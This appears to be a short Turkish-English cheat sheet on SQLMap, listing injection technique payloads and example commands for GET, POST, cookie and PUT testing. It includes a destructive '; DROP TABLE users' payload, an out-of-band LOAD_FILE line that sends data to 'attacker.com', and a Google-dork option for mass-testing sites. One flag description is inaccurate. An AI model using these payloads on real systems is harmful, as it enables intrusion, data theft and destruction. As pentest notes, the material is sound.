# SQLMap usage

### Technique 


+ **B**: Boolean-based blind `AND 1=1`
+ **E**: Error-based `AND GTID_SUBSET(@@version,0)`
+ **U**: Union query-based `UNION ALL SELECT 1,@@version,3`
+ **S**: Stacked queries `; DROP TABLE users`
+ **T**: Time-based blind `AND 1=IF(2>1,SLEEP(5),0)`
+ **Q**: Inline queries `SELECT (SELECT @@version) from`


#### Out-of-band SQL Injection

+ `LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`


### SQLMap Otomatik Parametre Bulma Seçenekleri

SQLMap'e test için doğrudan bir parametre (Örn: `?id=1`) verilmediğinde, hedefteki açıkları otomatik tespit etmek için aşağıdaki anahtarlar kullanılır:

*   **`--crawl`**: Hedef web sitesini bir örümcek gibi tarar. Ana sayfadan başlayarak sitedeki tüm linkleri ve alt sayfaları otomatik olarak gezer, buralardaki zafiyet barındırabilecek parametreli URL'leri toplar ve test eder.
*   **`--forms`**: Hedef sayfada yer alan tüm HTML formlarını (giriş panelleri, arama kutuları, iletişim formları vb.) otomatik olarak tespit eder. Bu formların arka plana gönderdiği POST isteklerini yakalayarak SQL enjeksiyonu zafiyeti açısından test eder.
*   **`-g`**: Google dork sonuçlarını hedef alır. Belirttiğiniz bir Google arama sorgusunun (Örn: `inurl:index.php?id=`) sonuçlarında çıkan tüm web sitelerini otomatik olarak sırayla SQLMap testine tabi tutar.


## SQLMap GET/POST

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```


**Cookie verme**
```bash
sqlmap 'http://www.example.com/' --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# yada

sqlmap 'http://www.example.com/' -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

## SQLMap PUT

```bash
 sqlmap -u www.target.com --data='id=1' --method PUT
```

# Handling SQLMap Errors

**termianlde gösterir**
+ `--parse-errors` **parametresi veri tabanı hatalarının terminale yazar database tespiti için kullanılır**

**dosyaya kaydeder**
+ `-t /file.txt` **parametresi veri tabanı hatalarını dosyaya yazar**
